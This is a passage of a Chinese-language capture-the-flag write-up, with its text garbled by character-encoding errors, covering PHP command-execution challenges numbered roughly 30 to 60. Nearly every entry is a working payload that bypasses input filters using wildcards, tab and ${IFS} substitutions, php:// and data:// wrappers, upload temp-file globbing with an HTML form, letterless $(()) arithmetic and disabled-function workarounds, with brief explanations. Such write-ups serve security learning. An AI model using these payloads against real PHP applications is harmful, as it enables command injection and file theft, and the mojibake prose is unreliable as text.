aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¢˜ç›®è¿‡æ»¤äº†flagï¼Œä½¿ç”¨é€šé…ç¬¦ç»•è¿‡ï¼Œf*ä»£è¡¨åŒ¹é…æ‰€æœ‰ä»¥få¼€å¤´çš„æ–‡ä»¶ï¼Œ`å†…éƒ¨ä¸ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œé€šè¿‡echoå¾—åˆ°è¿”å›å€¼`</p><h5 id="30"><a href="#30" class="headerlink" title="30"></a>30</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;echo(&#96;cat%20f*&#96;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¢˜ç›®è¿‡æ»¤äº†flag,system,phpï¼ŒåŒä¸Š</p><h5 id="31"><a href="#31" class="headerlink" title="31"></a>31</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;echo(&#96;tac%09f*&#96;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼ï¼Œä½¿ç”¨%09å°†ç©ºæ ¼æ›¿ä»£å³å¯</p><h5 id="32"><a href="#32" class="headerlink" title="32"></a>32</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·ï¼Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶åŒ…å«å‡½æ•°<code>include()</code>ï¼Œincludeå¯ä»¥å®ç°æ— æ‹¬å·åŒ…å«ï¼Œè¿›è€Œé€šè¿‡<code>?&gt;</code>å°†æ•´ä¸ªPHPä»£ç é—­åˆå³å¯ç»•è¿‡åˆ†å·ï¼Œè€Œåå°±èƒ½åšåˆ°å‚æ•°é€ƒé€¸ï¼ˆå› ä¸ºä»£ç ä¸­åªæ£€æµ‹äº†cä¸­ä¼ å…¥çš„å†…å®¹ï¼‰ï¼Œè¿›è€Œé€šè¿‡ä¼ å…¥å‚æ•°é€šè¿‡phpä¼ªåè®®è¯»å–å†…å®¹</p><h5 id="33"><a href="#33" class="headerlink" title="33"></a>33</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·ï¼ŒåŒä¸Š</p><h5 id="34"><a href="#34" class="headerlink" title="34"></a>34</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·ï¼ŒåŒä¸Š</p><h5 id="35"><a href="#35" class="headerlink" title="35"></a>35</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·,å·¦å°–æ‹¬å·,ç­‰äºå·ï¼ŒåŒä¸Š</p><h5 id="36"><a href="#36" class="headerlink" title="36"></a>36</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·,å·¦å°–æ‹¬å·,ç­‰äºå·,æ•°å­—ï¼Œå°†getå‚æ•°ä¸­çš„æ•°å­—æ”¹ä¸ºå­—æ¯å³å¯</p><h5 id="37"><a href="#37" class="headerlink" title="37"></a>37</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;php:&#x2F;&#x2F;inputè¯·æ±‚ä½“:&lt;?php include &quot;flag.php&quot;?&gt;æˆ–payload:?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>includeå‡½æ•°å¼€å§‹ï¼Œè¿‡æ»¤äº†flagï¼Œé€šè¿‡php://inputä¼ªåè®®ç›´æ¥åŒ…å«æ–‡ä»¶</p><h5 id="38"><a href="#38" class="headerlink" title="38"></a>38</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿‡æ»¤äº†flag, php,fileï¼Œé€šè¿‡dataä¼ªåè®®æ‰§è¡Œinclude â€œflag.phpâ€</p><h5 id="39"><a href="#39" class="headerlink" title="39"></a>39</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat fla*.php&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿‡æ»¤äº†flagå¹¶ä¸”åŒ…å«çš„æ˜¯å˜é‡c.phpï¼Œè¾“å…¥åç›¸å½“äºç›´æ¥æ‰§è¡Œè¾“å…¥çš„PHPå‘½ä»¤ï¼Œç”±äºå‰é¢çš„PHPå†…å®¹å·²ç»é—­åˆï¼Œæ‰€ä»¥åé¢çš„.phpç›´æ¥å°±æ˜¯.phpæ–‡æœ¬æ˜¾ç¤ºï¼Œå¯¹å‰é¢çš„å‘½ä»¤è¾“å…¥æ²¡æœ‰å½±å“</p><h5 id="40"><a href="#40" class="headerlink" title="40"></a>40</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;eval(array_pop(next(get_defined_vars())));POST:a&#x3D;system(&#39;cat flag.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>print_r(get_defined_vars());å¯ä»¥æ‹¿åˆ°æ‰€æœ‰å·²ç»å®šä¹‰çš„å˜é‡å¹¶å–å¾—å€¼</p><p>next(å˜é‡)å¯ä»¥è·å¾—ä¸‹ä¸€ä¸ªå˜é‡</p><p>array_pop(æ•°ç»„)å¼¹å‡ºæ•°ç»„ä¸­çš„å˜é‡ä¸ºå•ä¸ªç‹¬ç«‹å˜é‡</p><pre class="line-numbers language-none"><code class="language-none">c&#x3D;session_start();system(session_id());passid&#x3D;ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ¬åœ°ä¿®æ”¹sessionIDä¼ å…¥å‘½ä»¤</p><h5 id="41"><a href="#41" class="headerlink" title="41"></a>41</h5><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥å‘ç°å¤§å¤šæ•°è‡ªè´Ÿéƒ½è¢«è¿‡æ»¤ï¼ŒæŸ¥çœ‹æç¤º</p><p>é€šè¿‡è„šæœ¬å¯è·å–å¼‚æˆ–ï¼ˆï½œï¼‰åèƒ½å¾—åˆ°çš„æ‰€æœ‰å­—ç¬¦</p><p>ç›´æ¥ä½¿ç”¨è„šæœ¬</p><h5 id="42"><a href="#42" class="headerlink" title="42"></a>42</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;cat flag.php;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>$c.â€ &gt;/dev/null 2&gt;&amp;1â€</p><p>é¢˜ç›®ä¸­å°†å‘½ä»¤è¾“å‡ºä¿å­˜åˆ°é»‘æ´ä¸­ï¼Œå¯é€šè¿‡åˆ†å·åˆ†å‰²å‘½ä»¤è®©ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„å‘½ä»¤ç›´æ¥æ˜¾ç¤º</p><h5 id="43"><a href="#43" class="headerlink" title="43"></a>43</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%20flag.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†catå’Œåˆ†å·ï¼Œé€šè¿‡&amp;&amp;ä¹Ÿå¯è¿›è¡Œå¤šå‘½ä»¤æ‰§è¡Œï¼Œè¦è¿›è¡ŒURLç¼–ç </p><h5 id="44"><a href="#44" class="headerlink" title="44"></a>44</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%20fla*.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†flagï¼Œä½¿ç”¨é€šé…ç¬¦</p><h5 id="45"><a href="#45" class="headerlink" title="45"></a>45</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac$&#123;IFS&#125;fla*.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰¾ä¸ªèƒ½æ›¿ä»£çš„å°±è¡Œ</p><h5 id="46"><a href="#46" class="headerlink" title="46"></a>46</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%09fla?.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†*å’Œ$ï¼Œä½¿ç”¨%09ï¼ˆåˆ¶è¡¨ç¬¦ï¼‰æ›¿ä»£ç©ºæ ¼</p><h5 id="47"><a href="#47" class="headerlink" title="47"></a>47</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%09fla?.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†ä¸€äº›è¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼Œä½†æ²¡æ»¤tacï¼Œç›´æ¥ç”¨</p><h5 id="48"><a href="#48" class="headerlink" title="48"></a>48</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac&lt;fl%27%27ag.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†æ•°å­—å’Œç©ºæ ¼</p><h5 id="49"><a href="#49" class="headerlink" title="49"></a>49</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac&lt;fl%27%27ag.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†æ°´å¹³åˆ¶è¡¨ç¬¦å’Œ&amp;&amp;ç¬¦ï¼Œå°†&amp;æ›´æ¢ä¸ºï½œä¹Ÿå¯ä»¥å¤šå‘½ä»¤æ‰§è¡Œ</p><h5 id="50"><a href="#50" class="headerlink" title="50"></a>50</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac&lt;fl%27%27ag.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="51"><a href="#51" class="headerlink" title="51"></a>51</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;nl&lt;fla%27%27g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ»¤äº†tacå‘œå‘œå‘œå‘œç”¨nl</p><h5 id="52"><a href="#52" class="headerlink" title="52"></a>52</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;nl$&#123;IFS&#125;&#x2F;fl%27%27ag||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ»¤æ‰äº†å°–æ‹¬å·ä½†æ˜¯$å›æ¥äº†</p><p><code>nl$&#123;IFS&#125;fla%27%27g.php||</code></p><p>ä½†æ˜¯æ˜æ˜¾flagä¸å¯¹ï¼Œæ‰€ä»¥çœ‹ä¸€ä¸‹æ ¹ç›®å½•<code>ls$&#123;IFS&#125;/</code>å‘ç°flagå­˜åœ¨</p><p>ä½¿ç”¨nlè¯»å–</p><h5 id="53"><a href="#53" class="headerlink" title="53"></a>53</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;ta%27%27c$&#123;IFS&#125;fla?.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¯¥é¢˜å†…å®¹ä¸åŒ</p><pre class="line-numbers language-none"><code class="language-none">echo($c);$d &#x3D; system($c);echo &quot;&lt;br&gt;&quot;.$d;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å…ˆå°†å‘½ä»¤æ‰“å°å¹¶æ‰§è¡Œåè·å¾—systemå‡½æ•°çš„è¿”å›å€¼å¹¶è¾“å‡ºï¼Œsystemå‡½æ•°åªè¿”å›å‘½ä»¤æ‰§è¡Œåè¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œä½¿ç”¨tac</p><h5 id="54"><a href="#54" class="headerlink" title="54"></a>54</h5><pre class="line-numbers language-none"><code class="language-none">payload:c&#x3D;mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;kkk.txt&#x2F;kkk.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº†å•å¼•å·ç»•è¿‡ï¼Œé€šè¿‡mvå‘½ä»¤é‡å‘½åç›´æ¥è¯»å–</p><h5 id="55"><a href="#55" class="headerlink" title="55"></a>55</h5><p>è¿‡æ»¤<code>&quot;/\;|[a-z]|\</code>|%|\x09|\x26|&gt;|&lt;/iâ€</p><p><strong>æ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ</strong></p><p>ç›´æ¥è®²åŸç†å’¯</p><p>.ï¼ˆç‚¹ï¼‰æˆ–è€…å«periodï¼Œå®ƒçš„ä½œç”¨å’Œsourceä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„shellæ˜¯bashï¼Œåˆ™â€œ.fileâ€çš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ç”¨â€œ.fileâ€æ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯ä¸éœ€è¦fileæœ‰xæƒé™çš„ã€‚é‚£ä¹ˆï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„æ–‡ä»¶ï¼Œé‚£ä¸å°±å¯ä»¥åˆ©ç”¨â€œ.â€æ¥æ‰§è¡Œå®ƒäº†å—ï¼Ÿ</p><p>å’‹æ‰§è¡Œå‘¢ï¼ŒåŸç†æ˜¯å½“æˆ‘ä»¬å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…æ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«å‚¨å­˜åœ¨ä¸´æ—¶ç›®å½•ä¸­ï¼Œé»˜è®¤çš„æ–‡ä»¶æ˜¯<code>/tmp/phpXXXXXX</code>(å…­ä¸ªéšæœºå­—ç¬¦)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨é€šé…ç¬¦ï¼ˆ?å•åŒ¹é…å’Œ*å¤šåŒ¹é…ï¼‰æ¥å°è¯•æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä½†æ˜¯å°è¯•æ‰§è¡Œåå‘ç°ä¸è¡Œï¼Œæˆ‘ä»¬è‡ªå·±æ­å»ºä¸€ä¸ªphpç¯å¢ƒçœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆ</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming1.png"></p><p>åˆ—å‡ºç›¸å…³çš„æ–‡ä»¶åå‘ç°æ˜¯å› ä¸ºç¬¦åˆåŒ¹é…æ¡ä»¶çš„æ–‡ä»¶æ•°é‡ä¸æ­¢ä¸€ä¸ªï¼Œå°±å¯¼è‡´è¿˜æ²¡è¿è¡Œåˆ°æˆ‘ä»¬ä¸Šä¼ çš„è„šæœ¬æ—¶å°±å·²ç»ç»“æŸäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°è¯•ç”¨å…¶ä»–çš„é€šé…ç¬¦åŒ¹é…å‡ºæˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ç›¸å…³èµ„æ–™ï¼ŒLinuxçš„globé€šé…ç¬¦çš„ç›¸å…³å†…å®¹ï¼ˆè´´ä¸ªé“¾æ¥ï¼‰</p><p><a href="https://man7.org/linux/man-pages/man7/glob.7.html">https://man7.org/linux/man-pages/man7/glob.7.html</a></p><p>é™¤äº†ä½¿ç”¨?å’Œ*è¿›è¡Œä»»æ„åŒ¹é…ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>[^X]</code>æ¥æ’é™¤æŸä¸ªå­—ç¬¦ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ’é™¤å‰é¢åŒ…å«<code>-</code>å’Œ<code>.</code>æ–‡ä»¶ï¼Œç»§ç»­æŸ¥çœ‹å‘ç°è¿˜å‰©ä¸‹ä¸‰ä¸ªæ–‡ä»¶ï¼Œè€Œåå‘ç°è¿˜æœ‰ä¸€ä¸ªé€šé…ç¬¦è¯­æ³•<code>[X-Y]</code>å¯ä»¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼Œè€Œä¸”åªæœ‰phpä¸´æ—¶æ–‡ä»¶ä¸­åŒ…å«å¤§å†™å­—æ¯ï¼ŒæŸ¥è¯¢asciiç è¡¨å‘ç°å¤§å†™å­—æ¯ä½äº<code>@</code>å’Œ<code>[</code>ä¹‹é—´ï¼Œæ‰€ä»¥æ„é€ <code>[@-[]</code>å°±å¯ä»¥åŒ¹é…åˆ°æˆ‘ä»¬çš„æ–‡ä»¶äº†</p><p>æœ€ç»ˆpayload</p><p>é¦–å…ˆæ„å»ºä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„html</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POSTæ•°æ®åŒ…POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>å½“å‰é“¾æ¥/?c=./???/????????[@-[]<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æ–‡ä»¶åï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>æäº¤<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸€ä¸ªæ–‡ä»¶å†…å®¹</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">lsç„¶åcat &#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœä¸€æ¬¡ä¸æˆåŠŸå°±repeaterå¤šè¯•å‡ æ¬¡</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png"></p><p>æ‹¿åˆ°flag</p><h5 id="57"><a href="#57" class="headerlink" title="57"></a>57</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>[a-z]|[0-9]|`||#|&#39;|&quot;|`|%|\x09|\x26|\x0a|&gt;|&lt;|.|,|?|*|-|=|[/i</p><p>è¿‡æ»¤äº†å¤§é‡å­—ç¬¦ï¼Œæœ€ç»ˆéœ€è¦æ„å»º36å³å¯ï¼Œæ²¡æœ‰è¿‡æ»¤<code>$</code>ï¼Œè€Œåœ¨Linuxä¸­$æ˜¯å˜é‡çš„å…³é”®å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å˜é‡</p><pre class="line-numbers language-none"><code class="language-none">$(())è¿™ä¸ªå˜é‡ä¸­çš„()ä»£è¡¨æ•°å­¦è¿ç®—ï¼Œç»“æœä¸º0ï¼Œæ‰€ä»¥echo $(())0å¯¹è¿™ä¸ªå˜é‡è¿›è¡Œå–åæ“ä½œç»“æœä¸ºecho ~$(())~0é‚£ä¹ˆæˆ‘ä»¬å†å¯¹~0è¿›è¡Œæ•°å­¦è¿ç®—å¾—åˆ°çš„ç»“æœå°±æ˜¯echo $((~$(())))~1æ‰€ä»¥æˆ‘ä»¬æƒ³å¾—åˆ°36å°±æ˜¯è®©36ä¸ª~1ç›¸åŠ å†å–åecho $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="58"><a href="#58" class="headerlink" title="58"></a>58</h5><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;file_get_contents(&#39;flag.php&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°</p><p>é¦–å…ˆå°è¯•systemå‘ç°è¢«è¿‡æ»¤äº†ï¼Œemmmmå°è¯•è¿‡åå‘ç°èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å…¨è¢«ç¦ç”¨äº†</p><p>é‚£ä¹ˆå°è¯•èƒ½å¦è¯»å–æ–‡ä»¶ï¼Œä½¿ç”¨file_get_contentsè¯»å–æˆåŠŸï¼Œæç¤ºä¸­ä¹Ÿæ˜¾ç¤ºshow_sourceåŒæ ·å¯ç”¨</p><h5 id="59"><a href="#59" class="headerlink" title="59"></a>59</h5><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;show_source(&#39;flag.php&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å°±åˆ«è¯•äº†ï¼Œå…¨æŒ‚äº†</p><p>show_sourceå¯ç”¨</p><p>è¿˜å¯å°è¯•é€šè¿‡includeæ¥åŒ…å«æ–‡ä»¶ï¼Œå†é€šè¿‡PHPä¼ªåè®®è¿›è¡Œè¯»å–</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.phpPOSTc&#x3D;include($_GET[&#39;flie&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="60"><a href="#60" class="headerlink" title="60"></a>60</h5><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;highlight_file(&#39;flag.php&#39;);<span aria-hidden="true" 